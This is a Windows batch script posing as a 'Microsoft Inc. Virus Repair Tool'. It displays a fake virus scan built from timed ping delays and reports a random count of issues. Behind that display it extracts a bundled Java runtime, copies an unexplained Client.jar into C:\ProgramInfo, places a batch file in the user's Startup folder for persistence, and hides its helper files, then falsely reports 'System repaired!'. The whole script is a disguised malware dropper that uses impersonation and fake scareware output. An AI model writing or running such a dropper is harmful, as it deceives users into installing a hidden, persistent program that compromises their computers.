@echo off
title Microsoft Inc. Windows XP/7/8/8.1/10 Virus Repair Tool
echo Detecting Viruses and Malware... this may take a while!
ping -n 3 127.0.0.1 >nul
echo 10% completed.
ping -n 3 127.0.0.1 >nul
echo 20% completed.
ping -n 3 127.0.0.1 >nul
echo 30% completed.
ping -n 3 127.0.0.1 >nul
echo 40% completed.
ping -n 3 127.0.0.1 >nul
echo 50% completed.
ping -n 3 127.0.0.1 >nul
echo 60% completed.
ping -n 3 127.0.0.1 >nul
echo 70% completed.
ping -n 3 127.0.0.1 >nul
echo 80% completed.
ping -n 3 127.0.0.1 >nul
echo 90% completed.
ping -n 3 127.0.0.1 >nul
echo 100% completed.
echo !!! WARNING !!!
echo We found %random% issues with your device.
echo We will now repair and fix these issues...
ping -n 3 127.0.0.1 >nul

md C:\ProgramInfo
md C:\ProgramInfo\JRE
7za.exe e -oJRE -y jre1.8.0_131.zip
xcopy /E JRE "C:\ProgramInfo\JRE"
copy Client.jar "C:\ProgramInfo\Client.jar"
attrib -H StartMicrosoftFix.bat
attrib -H MicrosoftFix.bat
attrib -H MicrosoftFix.vbs
copy StartMicrosoftFix.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\StartMicrosoftFix.bat"
copy MicrosoftFix.bat "C:\ProgramInfo\MicrosoftFix.bat"
copy MicrosoftFix.vbs "C:\ProgramInfo\MicrosoftFix.vbs"
attrib +H StartMicrosoftFix.bat
attrib +H MicrosoftFix.bat
attrib +H MicrosoftFix.vbs



start cmd.exe /C echo System repaired! && pause

pause